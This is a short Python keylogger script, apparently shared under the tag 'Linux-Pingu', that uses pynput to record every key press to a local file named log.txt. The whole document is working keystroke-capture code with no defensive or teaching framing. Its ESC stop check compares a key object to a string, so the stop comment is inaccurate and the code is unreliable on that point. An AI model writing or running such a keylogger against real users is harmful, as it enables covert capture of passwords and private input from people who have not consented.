# Importing necessary modules from pynput
from pynput.keyboard import Listener

# File to save keystrokes
log_file = "log.txt"

# Function to write each keystroke into the file
def write_to_file(key):
    try:
        # Convert key to string and remove unnecessary quotes
        key_data = str(key).replace("'", "")
        with open(log_file, "a") as f:
            f.write(key_data)
            f.write("\n")
    except:
        pass

# Function to run when a key is released
def on_release(key):
    if key == "Key.esc":
        # Stop listener when ESC is pressed
        return False

# Starting the keylogger
with Listener(on_press=write_to_file, on_release=on_release) as listener:
    listener.join()



#Linux-Pingu